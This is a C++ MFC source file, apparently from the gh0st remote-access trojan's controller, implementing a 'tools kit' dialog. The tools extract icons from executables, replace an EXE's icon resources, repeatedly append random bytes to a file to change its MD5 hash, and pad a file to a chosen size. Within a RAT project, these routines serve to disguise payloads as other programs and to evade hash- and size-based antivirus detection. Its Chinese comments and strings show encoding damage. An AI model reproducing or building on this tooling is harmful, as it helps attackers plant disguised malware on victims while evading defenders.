// MyToolsKit.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "MyToolsKit.h"
#include <Winbase.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyToolsKit dialog
CIcons *pIcons;

CMyToolsKit::CMyToolsKit(CWnd* pParent /*=NULL*/)
	: CDialog(CMyToolsKit::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyToolsKit)
	m_Path = _T("");
	m_time = 10;
	//}}AFX_DATA_INIT
}


void CMyToolsKit::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyToolsKit)
	DDX_Control(pDX, IDC_SLIDER1, m_Sllider);
	DDX_Control(pDX, IDC_LIST2, m_List);
	DDX_Text(pDX, IDC_EDIT_PATH, m_Path);
	DDX_Text(pDX, IDC_EDIT_TIME1, m_time);
	DDV_MinMaxUInt(pDX, m_time, 1, 100000);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CMyToolsKit, CDialog)
	//{{AFX_MSG_MAP(CMyToolsKit)
	ON_BN_CLICKED(IDC_SELECTICON, OnSelecticon)
	ON_LBN_SELCHANGE(IDC_LIST2, OnSelchangeList2)
	ON_WM_PAINT()
	ON_BN_CLICKED(IDC_BUTTON_SAVEAS, OnButtonSaveas)
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	ON_BN_CLICKED(IDC_BUTTON3, OnButton3)
	ON_BN_CLICKED(IDC_BUTTON2, OnButton2)
	ON_BN_CLICKED(IDC_SELECTFILE, OnSelectfile)
	ON_BN_CLICKED(IDC_START, OnStart)
	ON_BN_CLICKED(IDC_STOP, OnStop)
	ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON4, OnButton4)
	ON_BN_CLICKED(IDC_CHECK3, OnCheck3)
	ON_BN_CLICKED(IDC_FILE_PATH, OnFilePath)
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_SLIDER1, OnCustomdrawSlider1)
	ON_BN_CLICKED(IDC_BUTTON5, OnButton5)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyToolsKit message handlers

BOOL CMyToolsKit::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	m_hIcon=AfxGetApp()->LoadIcon(IDI_ICON_TOOL);
	SetIcon(m_hIcon,FALSE);
	SetIcon(m_hIcon,TRUE);

	//��ʼ��ͼ����Դ����
    lpIR = (LPICONRESOURCE )malloc(sizeof(ICONRESOURCE));
	lstrcpy( lpIR->szOriginalICOFileName, "Untitled" );
	lstrcpy( lpIR->szOriginalDLLFileName, "" );
	lpIR->nNumImages = 0;

	GetDlgItem(IDC_BUTTON_SAVEAS)->EnableWindow(FALSE);
	((CButton *)GetDlgItem(IDC_START))->EnableWindow(TRUE);
	((CButton *)GetDlgItem(IDC_STOP))->EnableWindow(FALSE);


	GetDlgItem(IDC_SLIDER1)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT5)->EnableWindow(FALSE);
	GetDlgItem(IDC_BUTTON5)->EnableWindow(FALSE);
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}


BOOL CALLBACK MyEnumProcedure( HANDLE  hModule, LPCTSTR  lpszType, LPTSTR  lpszName, LONG  lParam )	
{
    TCHAR	szBuffer[256];
    LONG    nIndex = LB_ERR;
    LPTSTR	lpID = NULL;
	
    // Name is from MAKEINTRESOURCE()
    if( HIWORD(lpszName) == 0 )
    {
        wsprintf( szBuffer, "ͼ�� [%d]", (DWORD)lpszName );
        lpID = lpszName;
    }
    else
    {
        // Name is string
        //lpID = strdup( lpszName );
        
		wsprintf( szBuffer, "ͼ�� [%s]", lpszName);
    }
    // Add it to the listbox
    nIndex = SendDlgItemMessage( (HWND)lParam, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)(szBuffer) );
    // Set the item data to be the name of the resource so we can get it later
    SendDlgItemMessage( (HWND)lParam, IDC_LIST2, LB_SETITEMDATA, (WPARAM)nIndex, (LPARAM)lpID );
	
    return TRUE;
}


void CMyToolsKit::OnSelecticon() 
{
	// TODO: Add your control notification handler code here
	TCHAR szFile[MAX_PATH] = {0};
	OPENFILENAME OpenFileName;
	
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
	OpenFileName.hwndOwner         = m_hWnd;
	OpenFileName.hInstance         = AfxGetInstanceHandle();
	OpenFileName.lpstrFilter       = _T("PE FILE (*.exe)\0*.exe\0*.dll\0*.ico\0*.bmp\0*.tcl\0\0");
	OpenFileName.lpstrCustomFilter = NULL;
	OpenFileName.nMaxCustFilter    = 0;
	OpenFileName.nFilterIndex      = 0;
	OpenFileName.lpstrFile         = szFile;
	OpenFileName.nMaxFile          = sizeof(szFile);
	OpenFileName.lpstrFileTitle    = NULL;
	OpenFileName.nMaxFileTitle     = 0;
	OpenFileName.lpstrInitialDir   = _T(".");
	OpenFileName.lpstrTitle        = _T("��ѡ��PE�ļ�");
	OpenFileName.nFileOffset       = 0;
	OpenFileName.nFileExtension    = 0;
	OpenFileName.lpstrDefExt       = NULL;
	OpenFileName.Flags             = OFN_SHOWHELP | OFN_EXPLORER;
	
	
	if(GetOpenFileName(&OpenFileName))
	{
		
		szOpenFileName = szFile;
		
		char *Poiner = szFile;
		
		WORD i = strlen(szFile);
		
		Poiner+=i-3;
		
		szOpenFileExtName.Format("%s",Poiner);
		
		Poiner=NULL;
		
		szOpenFileExtName.MakeLower ();
		
		m_List.ResetContent (); //ѡ������ͼ���б��
		
		if(szOpenFileExtName == "exe")//��ȡ����ʾEXE��DLL����Դ�ļ�
		{
			HINSTANCE  hLibrary;
			
			// Load the DLL/EXE - NOTE: must be a 32bit EXE/DLL for this to work
			if( (hLibrary = LoadLibraryEx( szOpenFileName, NULL, LOAD_LIBRARY_AS_DATAFILE )) == NULL )
			{
				// Failed to load - abort
				MessageBox( szOpenFileName+ "�ļ�������󣬱�����WIN32���ļ�!", "����", MB_OK );
				return;
			}
			// Store the info
			EDII.szFileName =szOpenFileName;
			EDII.hInstance = hLibrary;
			
			// Fill in the listbox with the icons available
			if( ! EnumResourceNames( EDII.hInstance, RT_GROUP_ICON, (ENUMRESNAMEPROC )MyEnumProcedure, (LPARAM)GetSafeHwnd()) )
			{
				MessageBox( "�о�ͼ����Դ��ʱ����!", "����", MB_OK );
				return;
			}
			
		}
		
		m_List.SetCurSel (0);
		if( m_List.GetCount()  == 0 )
		{
			MessageBox( "���ļ���û��ͼ����Դ!", "����", MB_OK );
			//��ͼ����Դ���ñ���͸��ư�ťΪ��Ч״̬
			GetDlgItem(IDC_BUTTON_SAVEAS)->EnableWindow(FALSE);
			return;
		}
        //��ͼ����Դ���ñ���͸��ư�ťΪ��Ч״̬��������
		GetDlgItem(IDC_BUTTON_SAVEAS)->EnableWindow(TRUE);
		
		//ˢ�µ���OnPaint����ʾͼ��
		InvalidateRect(NULL,TRUE);
		
	}
}

void CMyToolsKit::OnSelchangeList2() 
{
	// TODO: Add your control notification handler code here
	InvalidateRect(NULL,TRUE);
}

void CMyToolsKit::OnPaint() 
{
	CPaintDC dc(this); // device context for painting
	
	// TODO: Add your message handler code here
	LPTSTR lpIconID;
	HICON hIcon;
	if((lpIconID=(LPTSTR)m_List.GetItemData(m_List.GetCurSel()))!=(LPTSTR)LB_ERR )
	{
		if(szOpenFileExtName=="exe"||szOpenFileExtName=="dll"||szOpenFileExtName=="icl")
		{
			hIcon=pIcons->GetIconFromInstance(EDII.hInstance,lpIconID);
			CStatic* pStatic = (CStatic*) GetDlgItem(IDC_ICONS);
			pStatic->SetIcon (hIcon);
		}
	}
	// Do not call CDialog::OnPaint() for painting messages
}


void CMyToolsKit::OnButtonSaveas() 
{
	// TODO: Add your control notification handler code here
	LPTSTR lpIconID;
	
	CFileDialog fileDialog( FALSE,"*.ICO",NULL,NULL,"ͼ���ļ�(*.ICO)|*.ICO|λͼ�ļ�(*.BMP)|*.BMP||");
	if (fileDialog.DoModal() == IDOK) 
	{
		szSaveFileName=fileDialog.GetPathName();	
        szSaveFileExtName= fileDialog.GetFileExt ();
		szSaveFileExtName.MakeLower ();
		
		if(szOpenFileExtName=="exe"||szOpenFileExtName=="dll"||szOpenFileExtName=="icl")
		{
			if((lpIconID=(LPTSTR)m_List.GetItemData (m_List.GetCurSel()))!= (LPTSTR)LB_ERR)
			{
				lpIR=pIcons->ReadIconFromEXEFile (szOpenFileName,lpIconID);
			}
		}
        if(szSaveFileExtName=="bmp")
		{
			if(lpIR!=NULL && m_List.GetCount ()>0)
			{
				BeginWaitCursor();
				pIcons->IconImageToBMPFile (szSaveFileName,&lpIR->IconImages [0]);
				EndWaitCursor();
			}
			else
				MessageBox( "û�пɱ����ͼ����Դ!", "����", MB_OK );
		}
		else if(szSaveFileExtName=="ico")
		{
			if(lpIR!=NULL && m_List.GetCount ()>0)
			{
				BeginWaitCursor();
				pIcons->WriteIconToICOFile (lpIR,szSaveFileName);
				EndWaitCursor();
			}
			else
				MessageBox( "û�пɱ����ͼ����Դ!", "����", MB_OK );
		}
	}
}

void CMyToolsKit::OnButton3() 
{
	// TODO: Add your control notification handler code here
	TCHAR szFile[MAX_PATH] = {0};
	OPENFILENAME OpenFileName;
	
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
	OpenFileName.hwndOwner         = m_hWnd;
	OpenFileName.hInstance         = AfxGetInstanceHandle();
	OpenFileName.lpstrFilter       = _T("PE FILE (*.exe)\0*.exe\0\0");
	OpenFileName.lpstrCustomFilter = NULL;
	OpenFileName.nMaxCustFilter    = 0;
	OpenFileName.nFilterIndex      = 0;
	OpenFileName.lpstrFile         = szFile;
	OpenFileName.nMaxFile          = sizeof(szFile);
	OpenFileName.lpstrFileTitle    = NULL;
	OpenFileName.nMaxFileTitle     = 0;
	OpenFileName.lpstrInitialDir   = _T(".");
	OpenFileName.lpstrTitle        = _T("��ѡ��EXE�ļ�");
	OpenFileName.nFileOffset       = 0;
	OpenFileName.nFileExtension    = 0;
	OpenFileName.lpstrDefExt       = NULL;
	OpenFileName.Flags             = OFN_SHOWHELP | OFN_EXPLORER;
	
	
	if(GetOpenFileName(&OpenFileName))
	{
		SetDlgItemText(IDC_EDIT2,szFile);	
	}
}

void CMyToolsKit::OnButton1() 
{
	// TODO: Add your control notification handler code here
	TCHAR szFile[MAX_PATH] = {0};
	OPENFILENAME OpenFileName;
	
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
	OpenFileName.hwndOwner         = m_hWnd;
	OpenFileName.hInstance         = AfxGetInstanceHandle();
	OpenFileName.lpstrFilter       = _T("ico FILE (*.ico)\0*.ico\0\0");
	OpenFileName.lpstrCustomFilter = NULL;
	OpenFileName.nMaxCustFilter    = 0;
	OpenFileName.nFilterIndex      = 0;
	OpenFileName.lpstrFile         = szFile;
	OpenFileName.nMaxFile          = sizeof(szFile);
	OpenFileName.lpstrFileTitle    = NULL;
	OpenFileName.nMaxFileTitle     = 0;
	OpenFileName.lpstrInitialDir   = _T(".");
	OpenFileName.lpstrTitle        = _T("��ѡ��ͼ���ļ�");
	OpenFileName.nFileOffset       = 0;
	OpenFileName.nFileExtension    = 0;
	OpenFileName.lpstrDefExt       = NULL;
	OpenFileName.Flags             = OFN_SHOWHELP | OFN_EXPLORER;
	
	
	if(GetOpenFileName(&OpenFileName))
	{
		SetDlgItemText(IDC_EDIT1,szFile);	
	}
}


#ifndef SAFE_RELEASE
#define SAFE_RELEASE(x) \
	if(x != NULL)        \
{                    \
	x->Release();     \
	x = NULL;         \
}
#endif

#ifndef SAFE_ARRAY_DELETE
#define SAFE_ARRAY_DELETE(x) \
	if(x != NULL)             \
{                         \
	delete[] x;            \
	x = NULL;              \
}
#endif

typedef struct tagHEADER      
{      
    WORD idReserved;      
    WORD idType;      
    WORD idCount;      
}HEADER, *LPHEADER;      

#pragma pack(push)      
#pragma pack(2)      
typedef struct tagGRPICONDIRENTRY      
{      
    BYTE bWidth;      
    BYTE bHeight;      
    BYTE bColorCount;      
    BYTE bReserved;      
    WORD wPlanes;      
    WORD wBitCount;      
    DWORD dwBytesInRes;      
    WORD nID;      
}GRPICONDIRENTRY, *LPGRPICONDIRENTRY;;      

typedef struct tagGRPICONDIR      
{      
    WORD idReserved;      
    WORD idType;      
    WORD idCount;      
    GRPICONDIRENTRY idEntries[1];      
}GRPICONDIR, *LPGRPICONDIR;      
#pragma pack(pop)     



BOOL ChangeExeIcon(LPCTSTR lpExeName,PBYTE pIconFileData,DWORD dwDataSize) 
{      
    LPICONDIRENTRY pIconDirEntry(NULL);
    LPGRPICONDIR pGrpIconDir(NULL);
    LPHEADER pHeader;
    LPBYTE pIconBytes(NULL);
    DWORD nGSize(0);
    HANDLE hUpdate(NULL);
    BOOL bReturn(FALSE);
    do
	{
		BOOL bRet;
		
		if(dwDataSize < sizeof(HEADER))break;
		pHeader = LPHEADER(pIconFileData);
		
		//����ÿһ��ͼ���Ŀ¼��Ϣ�������
		if(dwDataSize < 
			(sizeof(HEADER) + sizeof(ICONDIRENTRY) * pHeader->idCount))break;
		pIconDirEntry = LPICONDIRENTRY(pIconFileData + sizeof(HEADER));
		
		//����EXE�ļ���RT_GROUP_ICON��������ݽṹ�������
		nGSize = sizeof(GRPICONDIR) + sizeof(GRPICONDIRENTRY) * (pHeader->idCount - 1);
		pGrpIconDir = LPGRPICONDIR(new BYTE[nGSize]);
		ZeroMemory(pGrpIconDir,nGSize);
		
		//�����Ϣ�������൱��һ��ת���Ĺ���
		pGrpIconDir->idReserved = pHeader->idReserved;
		pGrpIconDir->idType = pHeader->idType;
		pGrpIconDir->idCount = pHeader->idCount;
		//������Ϣ������ÿһ��ͼ���Ӧ��ID��IDΪλ��������
		for(int i = 0;i < pHeader->idCount;i++)      
		{
			pGrpIconDir->idEntries[i].bWidth = pIconDirEntry[i].bWidth;
			pGrpIconDir->idEntries[i].bHeight = pIconDirEntry[i].bHeight;
			pGrpIconDir->idEntries[i].bColorCount = pIconDirEntry[i].bColorCount;
			pGrpIconDir->idEntries[i].bReserved = pIconDirEntry[i].bReserved;
			pGrpIconDir->idEntries[i].wPlanes = pIconDirEntry[i].wPlanes;
			pGrpIconDir->idEntries[i].wBitCount = pIconDirEntry[i].wBitCount;
			pGrpIconDir->idEntries[i].dwBytesInRes = pIconDirEntry[i].dwBytesInRes;
			pGrpIconDir->idEntries[i].nID = i+1;    //ID�������ѡ,����ò�Ҫ��֮ǰ���ڵ��г�ͻ,����ʹ�� FindResource(...,MAKEINTRESOURCE(n),RT_ICON);����
		}
		
		hUpdate = BeginUpdateResource(lpExeName, false);
		if (hUpdate)      
		{
			//���ȸ���RT_GROUP_ICON��Ϣ
			bRet = UpdateResource(
				hUpdate,
				RT_GROUP_ICON,
				MAKEINTRESOURCE(1),//EXE��ʾΪ��СID��ͼ����
				MAKELANGID(LANG_CHINESE,SUBLANG_CHINESE_SIMPLIFIED),
				pGrpIconDir,
				nGSize);
			if (!bRet)break;
			
			//���ŵ���ÿһ��Icon����Ϣ���
			for(int i = 0;i < pHeader->idCount;i++)
			{
				if(dwDataSize <
					(pIconDirEntry[i].dwImageOffset +
					pIconDirEntry[i].dwBytesInRes))break;
				pIconBytes = pIconFileData + pIconDirEntry[i].dwImageOffset;
				//׼��pIconBytes������ļ����Byte��Ϣ���ڸ��µ�EXE�С�
				
				//����ÿһ��ID��Ӧ��RT_ICON��Ϣ      
				bRet = UpdateResource(
					hUpdate,
					RT_ICON,
					MAKEINTRESOURCE(pGrpIconDir->idEntries[i].nID),
					MAKELANGID(LANG_CHINESE,SUBLANG_CHINESE_SIMPLIFIED),
					pIconBytes,
					pIconDirEntry[i].dwBytesInRes);
				if(!bRet)break;
			}
			//����EXE��Դ�ĸ��²���
			EndUpdateResource(hUpdate, false);
			bReturn = TRUE;
		}
	}while(false);
    
    //������Դ���ر�Icon�ļ������˸��²���������
    SAFE_ARRAY_DELETE(pGrpIconDir);
	return bReturn;
}

BOOL ChangeExeIcon(LPSTR lpIconFile, LPSTR lpExeName)
{
	HANDLE hIconFile = INVALID_HANDLE_VALUE;
	PBYTE pIconFileData = NULL;
	BOOL bSuceeded = FALSE;
	do
	{
		hIconFile= CreateFile(
			lpIconFile,
			GENERIC_READ,
			FILE_SHARE_READ,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		if(hIconFile == INVALID_HANDLE_VALUE)break;
		
		DWORD dwIconFileSize = GetFileSize(hIconFile,NULL);
		pIconFileData = new BYTE[dwIconFileSize];
		if(!pIconFileData)break;
		
		DWORD dwReaded;
		if(!ReadFile(
			hIconFile,
			pIconFileData,
			dwIconFileSize,
			&dwReaded,
			NULL))break;
		if(dwReaded != dwIconFileSize)break;
		
		if(!ChangeExeIcon(
			lpExeName,
			pIconFileData,
			dwIconFileSize))break;
		
		bSuceeded = TRUE;
		
	}while(false);
	
	if(pIconFileData)
		delete pIconFileData;
	if(hIconFile != INVALID_HANDLE_VALUE)
		CloseHandle(hIconFile);
	return TRUE;
}

void CMyToolsKit::OnButton2() 
{
	// TODO: Add your control notification handler code here
	char ExePath[MAX_PATH]={NULL};
	
	char IconPath[MAX_PATH]={NULL};
	
	GetDlgItemText(IDC_EDIT2,ExePath,MAX_PATH);
	GetDlgItemText(IDC_EDIT1,IconPath,MAX_PATH);
	
	if(ChangeExeIcon(IconPath,ExePath))
	{
		MessageBox("��ϲ �ļ��޸ĳɹ�!!!");
	}
	else
	{
		MessageBox("�ļ��޸�ʧ��!!!");
	}

}
void MD5_File (char * filename,char *MD5);
void CMyToolsKit::OnSelectfile() 
{
	// TODO: Add your control notification handler code here
	TCHAR szFile[MAX_PATH] = {0};
	OPENFILENAME OpenFileName;
	
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
	OpenFileName.hwndOwner         = m_hWnd;
	OpenFileName.hInstance         = AfxGetInstanceHandle();
	OpenFileName.lpstrFilter       = _T("All File (*.*)\0*.*\0\0");
	OpenFileName.lpstrCustomFilter = NULL;
	OpenFileName.nMaxCustFilter    = 0;
	OpenFileName.nFilterIndex      = 0;
	OpenFileName.lpstrFile         = szFile;
	OpenFileName.nMaxFile          = sizeof(szFile);
	OpenFileName.lpstrFileTitle    = NULL;
	OpenFileName.nMaxFileTitle     = 0;
	OpenFileName.lpstrInitialDir   = _T(".");
	OpenFileName.lpstrTitle        = _T("��ѡ���ļ�");
	OpenFileName.nFileOffset       = 0;
	OpenFileName.nFileExtension    = 0;
	OpenFileName.lpstrDefExt       = NULL;
	OpenFileName.Flags             = OFN_SHOWHELP | OFN_EXPLORER;
	
	
	if(GetOpenFileName(&OpenFileName))
	{
		TCHAR szPathA[MAX_PATH] = {0};
		TCHAR szPathB[MAX_PATH] = {0};	
		
		char Md5[64]={NULL};
		
		MD5_File(szFile,Md5);
		SetDlgItemText(IDC_OMD3,Md5);
		
		m_Path=szFile;
		UpdateData(FALSE);
	}
}



void CMyToolsKit::OnStart() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	if(m_Path.GetLength()<1) 
	{
		MessageBox("����û��ѡ���ļ�!!","������ʾ",MB_ICONWARNING|MB_OK);
		return ;	
	}

	SetTimer(0x100,m_time*1000,NULL);
	((CButton *)GetDlgItem(IDC_START))->EnableWindow(FALSE);
	((CButton *)GetDlgItem(IDC_STOP))->EnableWindow(TRUE);
}

void CMyToolsKit::OnStop() 
{
	// TODO: Add your control notification handler code here
	// TODO: Add your control notification handler code here
	KillTimer(0x100);
	((CButton *)GetDlgItem(IDC_START))->EnableWindow(TRUE);
	((CButton *)GetDlgItem(IDC_STOP))->EnableWindow(FALSE);
}
DWORD CountTimes=0;
void CMyToolsKit::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	if(nIDEvent==0x100)
	{
		HANDLE m_Handle = CreateFile(m_Path.GetBuffer(0),GENERIC_WRITE,
			FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,
			NULL);
		if(m_Handle==INVALID_HANDLE_VALUE)
		{
			CDialog::OnTimer(nIDEvent);
			return;
		}
		char VarMd5[64]={NULL};
		ZeroMemory(VarMd5,64);
		GetDlgItemText(IDC_CMD5,VarMd5,64);

		if(strlen(VarMd5)<10)
			SetFilePointer(m_Handle,0,0,FILE_END);
		else
			SetFilePointer(m_Handle,-100,NULL,FILE_END);

		CHAR Buffer[100]={NULL};
		((CGh0stApp *)AfxGetApp())->GetRandString(Buffer,100);

		DWORD WriteBytes=0;
		WriteFile(m_Handle,Buffer,100,&WriteBytes,NULL);
		
		CloseHandle(m_Handle);

		char CMd5[64]={NULL};
		MD5_File(m_Path.GetBuffer(0),CMd5);
		SetDlgItemText(IDC_CMD5,CMd5);
	
		CountTimes++;

		CString szStr;
		szStr.Format("��ǰ���޸Ĵ��� %d ",CountTimes);
		SetDlgItemText(IDC_STATIC_COUNT,szStr);

	}
	CDialog::OnTimer(nIDEvent);
}

void CMyToolsKit::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	CDialog::OnClose();
}

void CMyToolsKit::OnButton4() 
{
	// TODO: Add your control notification handler code here
	TCHAR szFile[MAX_PATH] = {0};
	OPENFILENAME OpenFileName;
	
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
	OpenFileName.hwndOwner         = m_hWnd;
	OpenFileName.hInstance         = AfxGetInstanceHandle();
	OpenFileName.lpstrFilter       = _T("ICON (*.ico)\0\0");
	OpenFileName.lpstrCustomFilter = NULL;
	OpenFileName.nMaxCustFilter    = 0;
	OpenFileName.nFilterIndex      = 0;
	OpenFileName.lpstrFile         = szFile;
	OpenFileName.nMaxFile          = sizeof(szFile);
	OpenFileName.lpstrFileTitle    = NULL;
	OpenFileName.nMaxFileTitle     = 0;
	OpenFileName.lpstrInitialDir   = _T(".");
	OpenFileName.lpstrTitle        = _T("��ѡ��ͼ���ļ�");
	OpenFileName.nFileOffset       = 0;
	OpenFileName.nFileExtension    = 0;
	OpenFileName.lpstrDefExt       = NULL;
	OpenFileName.Flags             = OFN_SHOWHELP | OFN_EXPLORER;
	
	
	if(GetOpenFileName(&OpenFileName))
	{
		SetDlgItemText(IDC_EDIT1,szFile);	
	}
}

void CMyToolsKit::OnCheck3() 
{
	// TODO: Add your control notification handler code here
	
}

void CMyToolsKit::OnFilePath() 
{
	// TODO: Add your control notification handler code here
	TCHAR szFile[MAX_PATH] = {0};
	OPENFILENAME OpenFileName;
	
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
	OpenFileName.hwndOwner         = m_hWnd;
	OpenFileName.hInstance         = AfxGetInstanceHandle();
	OpenFileName.lpstrFilter       = _T("All FILE (*.*)\0*.*\0\0");
	OpenFileName.lpstrCustomFilter = NULL;
	OpenFileName.nMaxCustFilter    = 0;
	OpenFileName.nFilterIndex      = 0;
	OpenFileName.lpstrFile         = szFile;
	OpenFileName.nMaxFile          = sizeof(szFile);
	OpenFileName.lpstrFileTitle    = NULL;
	OpenFileName.nMaxFileTitle     = 0;
	OpenFileName.lpstrInitialDir   = _T(".");
	OpenFileName.lpstrTitle        = _T("��ѡ��ͼ���ļ�");
	OpenFileName.nFileOffset       = 0;
	OpenFileName.nFileExtension    = 0;
	OpenFileName.lpstrDefExt       = NULL;
	OpenFileName.Flags             = OFN_SHOWHELP | OFN_EXPLORER;
	
	
	if(GetOpenFileName(&OpenFileName))
	{
		SetDlgItemText(IDC_EDIT4,szFile);

		HANDLE Handle = CreateFile(szFile,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,
			NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
		if(Handle == INVALID_HANDLE_VALUE)
		{
			MessageBox("�ļ��ܾ�����..�볢�Ը���һ�� ���޸�!");
			return;
		}
		DWORD Size = GetFileSize(Handle,NULL)/1024;

		m_Sllider.SetRange(Size,10240);
		m_Sllider.SetPos(Size);

		CloseHandle(Handle);

		GetDlgItem(IDC_SLIDER1)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT5)->EnableWindow(TRUE);
		GetDlgItem(IDC_BUTTON5)->EnableWindow(TRUE);
	}
}

void CMyToolsKit::OnCustomdrawSlider1(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	SetDlgItemInt(IDC_EDIT5,m_Sllider.GetPos());

	*pResult = 0;
}

void CMyToolsKit::OnButton5() 
{
	// TODO: Add your control notification handler code here
	CHAR Path[MAX_PATH]={NULL};
	ZeroMemory(Path,MAX_PATH);

	GetDlgItemText(IDC_EDIT4,Path,MAX_PATH);
	
	HANDLE Handle = CreateFile(Path,GENERIC_WRITE,FILE_SHARE_WRITE,
		NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	if(Handle == INVALID_HANDLE_VALUE)
	{
		MessageBox("�ļ��ܾ�����..�볢�Ը���һ�� ���޸�!");
		return;
	}
	
	DWORD MotifySize=m_Sllider.GetPos();

	DWORD FileSize = GetFileSize(Handle,NULL)/1024;

	MotifySize = MotifySize - FileSize;
	
	CHAR Buffer[1024]={NULL};
	((CGh0stApp *)AfxGetApp())->GetRandString(Buffer,1024);
	
	SetFilePointer(Handle,0,0,FILE_END);

	DWORD WriteBytes=0;
	for (DWORD i=0;i<MotifySize;i++)
		WriteFile(Handle,Buffer,1024,&WriteBytes,NULL);
	
	CloseHandle(Handle);

	MessageBox("�޸ĳɹ�!");

}
